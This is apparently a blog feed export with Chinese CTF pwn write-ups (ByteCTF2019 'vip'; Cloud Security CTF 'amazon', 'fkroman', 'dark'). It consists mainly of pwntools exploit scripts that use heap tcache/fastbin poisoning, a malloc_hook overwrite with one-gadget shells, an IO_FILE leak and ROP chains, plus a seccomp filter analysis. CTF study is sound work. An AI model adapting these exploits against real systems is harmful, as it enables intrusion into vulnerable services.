<h3 id="exp-py-3"><a href="#exp-py-3" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./vip'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./vip'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BeVip</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    p.sendline(<span class="string">"6"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please tell us your name: \n"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#p.recvuntil("choice: ")</span></span><br><span class="line">    <span class="comment">#p.sendline("0")</span></span><br><span class="line">    <span class="comment">#p.recvuntil("Index: ")</span></span><br><span class="line">    <span class="comment">#p.sendline("0")</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0xfff</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">            p.sendline(<span class="string">"0"</span>)</span><br><span class="line">            p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">            p.sendline(<span class="string">"0"</span>)</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> count % <span class="number">0x10</span> == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">print</span> count</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload =<span class="string">'\x00'</span>*<span class="number">0x20</span></span><br><span class="line">    payload += p64(<span class="number">0x0000000000000020</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0000010100010015</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0000000000010035</span>)</span><br><span class="line">    payload += p64(<span class="number">0x0005000000000006</span>)</span><br><span class="line">    payload += p64(<span class="number">0x7fff000000000006</span>)</span><br><span class="line">    BeVip(payload)</span><br><span class="line">    <span class="comment">#leak lib</span></span><br><span class="line">    Alloc(<span class="number">0</span>)</span><br><span class="line">    Alloc(<span class="number">1</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    heap_lis = <span class="number">0x404100</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">'a'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)+p64(heap_lis))</span><br><span class="line">    Alloc(<span class="number">1</span>)</span><br><span class="line">    Alloc(<span class="number">2</span>)<span class="comment">#heap list</span></span><br><span class="line">    Edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(heap_lis)+p64(elf.got[<span class="string">'puts'</span>]))<span class="comment">#0 is heaplis</span></span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#leak stack</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(heap_lis)+p64(libc_base+libc.sym[<span class="string">"environ"</span>]))</span><br><span class="line">    Show(<span class="number">1</span>)</span><br><span class="line">    rbp_addr = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0xf8</span></span><br><span class="line">    log.success(<span class="string">"stack addr =&gt; "</span> + hex(rbp_addr))</span><br><span class="line">    bss_base = elf.bss()+<span class="number">0x40</span></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(heap_lis)+p64(bss_base))</span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">8</span>,<span class="string">"./flag\x00"</span>)<span class="comment">#file name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(heap_lis)+p64(rbp_addr+<span class="number">8</span>))</span><br><span class="line">    <span class="comment">#rop</span></span><br><span class="line">    <span class="comment">#open(123,'flag','r')</span></span><br><span class="line">    <span class="comment">#read(123,bss,0x80)</span></span><br><span class="line">    <span class="comment">#write(1,bss,0x80)</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    pop_rdi_ret = <span class="number">0x00000000004018fb</span></span><br><span class="line">    pop_rsi_r15_ret = <span class="number">0x00000000004018f9</span></span><br><span class="line">    pop_rdx_ret = <span class="number">0x0000000000001b96</span>+libc_base</span><br><span class="line">    pop_rax_ret = <span class="number">0x00000000000439c8</span>+libc_base</span><br><span class="line">    syscall_ret = <span class="number">0x00000000000d2975</span>+libc_base</span><br><span class="line">    push_rax_ret = <span class="number">0x000000000003dfed</span>+libc_base</span><br><span class="line">    mov_rdx_rax_ret = <span class="number">0x00000000001415dd</span>+libc_base</span><br><span class="line">    rop = <span class="string">""</span></span><br><span class="line">    rop += p64(pop_rdi_ret)+p64(bss_base)</span><br><span class="line">    rop += p64(pop_rsi_r15_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rdx_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rax_ret)+p64(<span class="number">2</span>)</span><br><span class="line">    rop += p64(syscall_ret)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    rop += p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">    rop += p64(pop_rsi_r15_ret)+p64(bss_base+<span class="number">0x170</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rdx_ret)+p64(<span class="number">0x80</span>)</span><br><span class="line">    rop += p64(pop_rax_ret)+ p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(syscall_ret)</span><br><span class="line">    <span class="comment">#rop += p64(elf.plt['read'])</span></span><br><span class="line">    <span class="comment">#wriet</span></span><br><span class="line">    rop += p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">    rop += p64(pop_rsi_r15_ret)+p64(bss_base+<span class="number">0x170</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(pop_rdx_ret)+p64(<span class="number">0x80</span>)</span><br><span class="line">    rop += p64(pop_rax_ret)+p64(<span class="number">1</span>)</span><br><span class="line">    rop += p64(syscall_ret)</span><br><span class="line">    rop += p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">    rop += p64(elf.plt[<span class="string">'exit'</span>])</span><br><span class="line">    Edit(<span class="number">1</span>,len(rop),rop)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x401897')</span></span><br><span class="line">    Exit()</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ByteCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>云安全CTF</title>
    <url>/2020/09/03/CloudSecCTF/</url>
    <content><![CDATA[<h1 id="数字经济云安全共测大赛初赛"><a href="#数字经济云安全共测大赛初赛" class="headerlink" title="数字经济云安全共测大赛初赛"></a>数字经济云安全共测大赛初赛</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>是第一场正经打的线上赛，上午做了俩题就去线下了（线下被暴打，不过那是另一个故事了）。前两题比较基础，第一题甚至混了二血，第三题是seccomp的题目，最近第二次见了，感觉很综合，今天花了一天做了出来（在17的提示下orz）。</p>
<h2 id="amazon"><a href="#amazon" class="headerlink" title="amazon"></a>amazon</h2><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>libc 2.27，check的时候double free，Show有UAF，Free(0x80)*8泄露libc，分配的时候先把这个unsorted bin分成chunk1和chunk2，再分配0x80的时候走tcache拿到和之前Unsorted bin一样的块，再从0x20处写实际上可以写chunk2的fd，修改到malloc_hook-0x28，从而可以写realloc_hook和malloc_hook，调整偏移即可get shell</p>
<h3 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./amazon'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./amazon'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'121.41.38.38'</span>,<span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(item_choice,num,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"What item do you want to buy: "</span>)</span><br><span class="line">    p.sendline(str(item_choice))</span><br><span class="line">    p.recvuntil(<span class="string">"How many: "</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">"How long is your note: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size &gt; <span class="number">0</span>:</span><br><span class="line">        p.recvuntil(<span class="string">": "</span>)</span><br><span class="line">        <span class="comment">#sleep(0.2)</span></span><br><span class="line">        p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which item are you going to pay for: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'1'</span>)<span class="comment">#1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        Free(<span class="number">0</span>)</span><br><span class="line">    Show()</span><br><span class="line">    p.recvuntil(<span class="string">"Name: "</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">96</span> - <span class="number">0x3ebc40</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    <span class="comment">#system_addr = libc_base + libc.sym['system']</span></span><br><span class="line">    realloc_addr = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="string">'0'</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">'0'</span>)<span class="comment">#3</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Free(<span class="number">3</span>)</span><br><span class="line">    payload= p64(<span class="number">0</span>)+p64(<span class="number">0x81</span>)+p64(malloc_hook<span class="number">-0x28</span>)</span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x80</span>,payload)<span class="comment">#4</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0x50</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#5</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"What item do you want to buy: "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"How many: "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"How long is your note: "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">80</span>))</span><br><span class="line">    <span class="comment">#print p.recv(128)</span></span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    p.send(p64(shell_addr)+p64(realloc_addr+<span class="number">0x4</span>))</span><br><span class="line">    <span class="comment">#Alloc(1,1,0x50,p64(system_addr))#6</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="comment">#Free(5)</span></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="fkroman"><a href="#fkroman" class="headerlink" title="fkroman"></a>fkroman</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>没有泄露的常规题，libc 2.23，这个题又有double free又有堆溢出。。有点可利用地方太多手忙脚乱的感觉，最后磨磨蹭蹭跑出来了算是。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./fkroman'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'121.40.246.48'</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./fkroman'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Alloc</span><span class="params">(idx,size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Alloc(<span class="number">0</span>,<span class="number">0x98</span><span class="number">-4</span>)<span class="comment">#0</span></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">0x68</span><span class="number">-4</span>)<span class="comment">#1</span></span><br><span class="line">    Alloc(<span class="number">2</span>,<span class="number">0x88</span><span class="number">-4</span>)<span class="comment">#2</span></span><br><span class="line">    Alloc(<span class="number">3</span>,<span class="number">0x88</span><span class="number">-4</span>)<span class="comment">#3</span></span><br><span class="line">    Free(<span class="number">0</span>)</span><br><span class="line">    Free(<span class="number">1</span>)</span><br><span class="line">    Edit(<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x90</span>))</span><br><span class="line">    Free(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">4</span>,<span class="number">0x98</span><span class="number">-4</span>)<span class="comment">#4</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Edit(<span class="number">4</span>,<span class="number">0xa2</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+<span class="string">'\xdd\x25'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#p.recvuntil('choice: ')</span></span><br><span class="line">    <span class="comment">#p.sendline('1')</span></span><br><span class="line">    <span class="comment">#p.recvuntil("Index: ")</span></span><br><span class="line">    <span class="comment">#p.sendline(str(5))</span></span><br><span class="line">    <span class="comment">#p.recvuntil("Invalid option!\n")</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#p.recvuntil("Size: ")</span></span><br><span class="line">    <span class="comment">#p.sendline(str(0x54))</span></span><br><span class="line">    Alloc(<span class="number">5</span>,<span class="number">0x34</span>)</span><br><span class="line">    Alloc(<span class="number">6</span>,<span class="number">0xa0</span>)<span class="comment">#6</span></span><br><span class="line">    Edit(<span class="number">6</span>,<span class="number">0x30</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">    Edit(<span class="number">4</span>,<span class="number">0xa0</span>,<span class="string">'a'</span>*<span class="number">0x90</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">7</span>,<span class="number">0x60</span>)<span class="comment">#</span></span><br><span class="line">    Alloc(<span class="number">8</span>,<span class="number">0x64</span>)<span class="comment">#8</span></span><br><span class="line">    <span class="comment">#leak</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Edit(<span class="number">8</span>,<span class="number">0x54</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"\x00\x18\xad\xfb"</span>)</span><br><span class="line">    p.recvn(<span class="number">0x1c</span>)</span><br><span class="line">    libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd2600</span><span class="number">-0x7ffff7a0d000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    fake_chunk = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span></span><br><span class="line">    Alloc(<span class="number">9</span>,<span class="number">0x68</span><span class="number">-4</span>)<span class="comment">#9</span></span><br><span class="line">    Free(<span class="number">9</span>)</span><br><span class="line">    Edit(<span class="number">9</span>,<span class="number">8</span>,p64(fake_chunk))</span><br><span class="line">    Alloc(<span class="number">10</span>,<span class="number">0x60</span>)<span class="comment">#10</span></span><br><span class="line">    Alloc(<span class="number">11</span>,<span class="number">0x60</span>)<span class="comment">#10</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">    Edit(<span class="number">11</span>,<span class="number">27</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(shell_addr))</span><br><span class="line"></span><br><span class="line">    Alloc(<span class="number">1</span>,<span class="number">0x17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./fkroman'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">        p = remote(<span class="string">'121.40.246.48'</span>,<span class="number">9999</span>)</span><br></pre></td></tr></table></figure>
<h2 id="dark"><a href="#dark" class="headerlink" title="dark"></a>dark</h2><h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>开始有个seccomp限制系统调用，程序保护没怎么开，main函数里有一处极大的栈溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">Init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x10</span>u);</span><br><span class="line">  v0 = seccomp_init(<span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">0x7FFF0000</span>LL, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">0x7FFF0000</span>LL, <span class="number">2L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">0x7FFF0000</span>LL, <span class="number">10L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v0);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[*] &apos;/home/ctf/Desktop/CTF/gongce/dark1/dark&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>seccomp-tools看下具体限制，只能执行open、read和mprotect系统调用<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0008</span><br><span class="line"> 0007: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0009</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></p>
<h3 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>这道题前半部分是0CTF的Black hole，程序里查gadgets查不到，但是got表可写，alarm+0x5的地方是syscall，csu把其低字节写改成syscall我们就有syscall用了，用read的返回值修改rax=0xa，调用syscall修改bss为rwxp，由于系统禁了write，我们栈迁移之后只能open和read，无法显示flag，请教17学长之后得知新的方法，单字节cmp爆破，根据结果jz到read，此时程序会阻塞等待输入，而其他情况下程序执行非法指令出错结束，以此我们可以一个字节一个字节地爆破flag，最终拿到完整flag。</p>
